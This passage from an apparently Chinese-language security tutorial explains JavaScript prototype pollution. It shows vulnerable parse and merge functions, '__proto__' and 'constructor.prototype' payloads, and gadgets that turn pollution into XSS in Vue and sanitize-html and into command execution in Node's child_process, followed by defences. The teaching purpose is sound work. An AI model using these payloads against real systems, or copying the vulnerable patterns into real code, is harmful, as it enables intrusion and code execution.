        <span class="token punctuation">&#125;</span>
        obj <span class="token operator">=</span> obj<span class="token punctuation">[</span>objKey<span class="token punctuation">]</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> result
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> qs <span class="token operator">=</span> <span class="token function">parseQs</span><span class="token punctuation">(</span><span class="token string">'test=1&amp;a[b][c]=2'</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>qs<span class="token punctuation">)</span>
<span class="token comment">// &#123; test: '1', a: &#123; b: &#123; c: '2' &#125; &#125; &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>基本上就是根據 <code>[]</code> 裡面的內容去構造出一個物件，一層一層去賦值，看起來沒什麼特別的。</p>
<p>但是！如果我的 query string 長這樣，事情就不一樣了：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> qs <span class="token operator">=</span> <span class="token function">parseQs</span><span class="token punctuation">(</span><span class="token string">'__proto__[a]=3'</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>qs<span class="token punctuation">)</span> <span class="token comment">// &#123;&#125;</span>

<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>當我的 query string 是這樣的時候，<code>parseQs</code> 就會去改變 <code>obj.__proto__.a</code> 的值，造成了 prototype pollution，導致我後來宣告一個空的物件，在印出 <code>obj.a</code> 的時候卻印出了 3，因為物件原型已經被污染了。</p>
<p>有不少在解析 query string 的 library 都出過類似的問題，底下簡單舉幾個例子：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-JQUERYDEPARAM-1255651">jquery-deparam</a></li>
<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-BACKBONEQUERYPARAMETERS-1290381">backbone-query-parameters</a></li>
<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-JQUERYQUERYOBJECT-1255650">jquery-query-object</a></li>
</ol>
<p>除了解析 query string 以外，另一個功能也很常發生這個問題，叫做合併物件，一個簡單的合併物件函式長得像這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> prop <span class="token keyword">in</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> a<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      a<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>prop<span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> config <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">c</span><span class="token operator">:</span> <span class="token number">2</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> customConfig <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">d</span><span class="token operator">:</span> <span class="token number">3</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">merge</span><span class="token punctuation">(</span>config<span class="token punctuation">,</span> customConfig<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>
<span class="token comment">// &#123; a: 1, b: &#123; c: 2, d: 3 &#125; &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果上面的 <code>customConfig</code> 是可以控制的，那就會發生問題：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> config <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">c</span><span class="token operator">:</span> <span class="token number">2</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> customConfig <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"__proto__": &#123;"a": 1&#125;&#125;'</span><span class="token punctuation">)</span>
<span class="token function">merge</span><span class="token punctuation">(</span>config<span class="token punctuation">,</span> customConfig<span class="token punctuation">)</span>

<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>這邊之所以用到 <code>JSON.parse</code>，是因為如果直接寫：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> customConfig <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">__proto__</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>是沒有用的，<code>customConfig</code> 只會是一個空物件而已。要用 <code>JSON.parse</code>，才能製造出一個「key 是 <code>__proto__</code>」的物件：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">__proto__</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> obj2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"__proto__": &#123;"a": 1&#125;&#125;'</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span> <span class="token comment">// &#123;&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span> <span class="token comment">// &#123; __proto__: &#123; a: 1 &#125; &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同樣地，也有許多 merge 相關的 library 曾經有這個漏洞，底下簡單列舉幾個：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-MERGE-1040469">merge</a></li>
<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-LODASHMERGE-173733">lodash.merge</a></li>
<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-PLAINOBJECTMERGE-1085643">plain-object-merge </a></li>
</ol>
<p>除了這些以外，只要是操作物件相關的 library 基本上都出現過類似問題，像是：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-IMMER-1019369">immer</a></li>
<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536">mootools</a></li>
<li><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-IOREDIS-1567196">ioredis</a></li>
</ol>
<p>現在已經知道哪些地方容易發生 prototype pollution 的問題了，但如果只是污染原型上的屬性，是沒有用的，還需要找到能影響到的地方，也就是說，有哪些地方在屬性被污染以後，行為會改變，可以讓我們執行攻擊？</p>
<h2><span id="prototype-pollution-script-gadgets">Prototype pollution script gadgets</span></h2><p>這些「只要我們污染了 prototype，就可以拿來利用的程式碼」叫做 script gadget，有一個 GitHub repo 專門搜集了這些 gadget：<a target="_blank" rel="noopener" href="https://github.com/BlackFan/client-side-prototype-pollution">Client-Side Prototype Pollution</a>，有些 gadget 可能是你想像不到的，我來示範一下（<a target="_blank" rel="noopener" href="https://aszx87410.github.io/demo/prototype-pollution/vue.html">demo 網頁</a>）：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://unpkg.com/vue/dist/vue.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    &#123;&#123; message &#125;&#125;
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token comment">// 污染 template</span>
    <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>template <span class="token operator">=</span> <span class="token string">'&lt;svg onload=alert(1)>&lt;/svg>'</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> 
      <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'Hello Vue!'</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一段看起來沒什麼的 Vue hello world，在我們污染了 <code>Object.prototype.template</code> 之後，就變成了 XSS，可以讓我們插入任意程式碼。</p>
<p>或是像下面這樣（<a target="_blank" rel="noopener" href="https://aszx87410.github.io/demo/prototype-pollution/vue.html">demo 網頁</a>）：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">'&lt;svg onload=alert(1)>&lt;/svg>'</span><span class="token punctuation">;</span>
    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">sanitizeHtml</span><span class="token punctuation">(</span><span class="token string">'&lt;div>hello&lt;/div>'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>明明是做 sanitize 的 library，在污染了 <code>Object.prototype.innerText</code> 之後，就變成了 XSS 的好幫手。</p>
<p>為什麼會有這些問題出現呢？以上面的 <code>sanitize-html</code> 為例，是因為有這一段程式碼：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>frame<span class="token punctuation">.</span>innerText <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>hasText <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>options<span class="token punctuation">.</span>textFilter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    result <span class="token operator">+=</span> frame<span class="token punctuation">.</span>innerText<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>因為直接預設了 innerText 是安全的字串，所以就直接拼接上去，而我們污染了這個屬性，因此當這個屬性不存在時，就會用到 prototype 的值，最後變成了 XSS。</p>
<p>除了 client side 以外，server side 的 Node.js 也有類似的風險，例如說這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> child_process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'123'</span><span class="token punctuation">]</span>
<span class="token keyword">const</span> result <span class="token operator">=</span> child_process<span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span>
  <span class="token string">'echo'</span><span class="token punctuation">,</span> params
<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>這是一段很單純的程式碼，執行 <code>echo</code> 指令然後傳入參數，這個參數會自動幫你做處理，所以不用擔心 command injection 的問題：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> child_process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'123 &amp;&amp; ls'</span><span class="token punctuation">]</span>
<span class="token keyword">const</span> result <span class="token operator">=</span> child_process<span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span>
  <span class="token string">'echo'</span><span class="token punctuation">,</span> params
<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 123 &amp;&amp; ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但如果有一個 prototype pollution 的漏洞，就可以搖身一變成為 RCE（Remote code execution），讓攻擊者執行任意指令（假設攻擊者可以控制 params）：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> child_process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'123 &amp;&amp; ls'</span><span class="token punctuation">]</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>shell <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token comment">// 只多了這行，參數的解析就會不一樣</span>
<span class="token keyword">const</span> result <span class="token operator">=</span> child_process<span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span>
  <span class="token string">'echo'</span><span class="token punctuation">,</span> params<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">1000</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">/*
123
index.js
node_modules
package-lock.json
package.json
*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>之所以會這樣，是因為 <code>child_process.spawn</code> 的第三個參數 options 中有一個選項叫做 <code>shell</code>，設為 true 以後會造成行為不同，而官網的<a target="_blank" rel="noopener" href="https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options">文件</a>也有寫說：</p>
<blockquote>
<p>If the shell option is enabled, do not pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution.</p>
</blockquote>
<p>透過 prototype pollution 搭配 script gadget（<code>child_process.spawn</code>），成功製造出一個嚴重性極高的漏洞。</p>
<h2><span id="中場總結">中場總結</span></h2><p>如果程式中存在某個功能，能讓攻擊者污染到 prototype 上面的屬性，這個漏洞就叫做 prototype pollution，而 prototype pollution 本身用途不大，需要跟其他的程式碼結合才能發揮作用，而可以跟他結合的程式碼就叫做 script gadget。</p>
<p>例如說 Vue 的內部實作會根據某個物件的 <code>template</code> 這個屬性渲染出相對應的東西，於是我們只要污染 <code>Object.prototype.template</code>，就可以製造出一個 XSS 漏洞。或像是 <code>child_process.spawn</code> 用到了 <code>shell</code>，所以污染它以後就變成了 RCE 漏洞。</p>
<p>要修復的其實並不是那些可以利用的 script gadget，除非你把每個物件取值的地方都改掉，但這其實也不是根治的方式。真正根治的方式，是杜絕掉 prototype pollution，讓 prototype 不會被污染，就沒有這些問題了。</p>
<h2><span id="該如何防禦">該如何防禦</span></h2><p>在 <a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-SWIPER-1088062">snyk</a> 的任何一個 prototype pollution 漏洞頁面上都會有防禦建議，也可以參考這一篇：<a target="_blank" rel="noopener" href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Prototype pollution attack in NodeJS application</a></p>
<p>常見的防禦方式有幾種，第一種是在做這些物件的操作時，阻止 <code>__proto__</code> 這個 key，例如說前面提到的解析 query string 跟 merge object 都可以採用這個方式。</p>
<p>但是除了 <code>__proto__</code> 以外，也要注意另外一種繞過方式，像這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
obj<span class="token punctuation">[</span><span class="token string">'constructor'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'prototype'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">var</span> obj2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj2<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>用 <code>constructor.prototype</code> 也可以去污染原型鏈上的屬性，所以要把這幾種一起封掉才安全。</p>
<p>像是 <a target="_blank" rel="noopener" href="https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad">lodash.merge</a> 的 prototype pollution 就是用這種方式修復的，當 key 是 <code>__proto__</code> 或是 <code>prototype</code> 的時候會做特殊處理。</p>
<p>第二種方式簡單易懂，就是不要用 object 了，或更精確地說，「不要用有 prototype 的 object」。</p>
<p>有些人可能看過一種建立物件的方式，是這樣的：<code>Object.create(null)</code>，這樣可以建立出一個沒有 <code>__proto__</code> 屬性的空物件，就是真的空物件，任何的 method 都沒有。也因為這樣，所以就不會有 prototype pollution 的問題：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>
obj<span class="token punctuation">[</span><span class="token string">'__proto__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment">// 根本沒有 __proto__ 這個屬性</span>
<span class="token comment">// TypeError: Cannot set property 'a' of undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>像是開頭提到的解析 query string 的 library，其實已經用了這種方式來防禦，像是每週下載次數高達 1 千萬次的 <a target="_blank" rel="noopener" href="https://www.npmjs.com/package/query-string">query-string</a>，<a target="_blank" rel="noopener" href="https://github.com/sindresorhus/query-string#parsestring-options">文件</a>上面就寫了：</p>
<blockquote>
<p>.parse(string, options?)<br>Parse a query string into an object. Leading ? or # are ignored, so you can pass location.search or location.hash directly.</p>
<p>The returned object is created with Object.create(null) and thus does not have a prototype.</p>
</blockquote>
<p>其他還有像是建議用 <code>Map</code> 來取代 <code>&#123;&#125;</code>，但我覺得目前大家還是習慣用 object 居多，我自己覺得 <code>Object.create(null)</code> 會比 Map 好用一點。</p>
<p>或是用 <code>Object.freeze(Object.prototype)</code>，把 prototype 凍結住，就沒辦法去修改：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
obj<span class="token punctuation">[</span><span class="token string">'__proto__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">var</span> obj2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj2<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但 <code>Object.freeze(Object.prototype)</code> 的問題之一是假設某個第三方套件有去修改 <code>Object.prototype</code>，比如說為了方便直接在上面加一個屬性，那就會比較難 debug，因為 freeze 之後去修改並不會造成錯誤，只是不會修改成功而已。</p>
<p>所以你可能會發現你的程式因為某個第三方套件壞掉了，但你不知道為什麼。還有一個我想到的可能風險是 polyfill，假設未來因為版本問題需要幫 <code>Object.prototype</code> 加上 polyfill，就會因為 freeze 的關係而失效。</p>
<p>至於 Node.js，還可以使用 <code>--disable-proto</code> 這個 option 來把 <code>Object.prototype.__proto__</code> 關掉，詳情可以參考<a target="_blank" rel="noopener" href="https://nodejs.org/api/cli.html#cli_disable_proto_mode">官方文件</a></p>
<p>或是未來也有可能使用 document policy 做處理，可以關注這個 issue： <a target="_blank" rel="noopener" href="https://github.com/WICG/document-policy/issues/33">Feature proposal: Mitigation for Client-Side Prototype Pollution</a></p>
<h2><span id="實際案例">實際案例</span></h2><p>最後我們來看兩個 prototype pollution 的真實案例，讓大家更有感覺一點。</p>
<p>第一個案例是知名 bug bounty 平台 hackerone 的漏洞（對，就是 bug bounty 平台本身的漏洞），完整報告在這裡：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/986386">#986386 Reflected XSS on www.hackerone.com via Wistia embed code</a></p>
<p>在網站上他們用了一個第三方套件，而在這個第三方套件裡面有一段程式碼長這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">i<span class="token punctuation">.</span>_initializers<span class="token punctuation">.</span><span class="token function-variable function">initWLog</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> e<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">,</span> o<span class="token punctuation">,</span> a<span class="token punctuation">,</span> l<span class="token punctuation">,</span> s<span class="token punctuation">,</span> d<span class="token punctuation">,</span> u<span class="token punctuation">,</span> p<span class="token punctuation">,</span> c<span class="token punctuation">;</span>
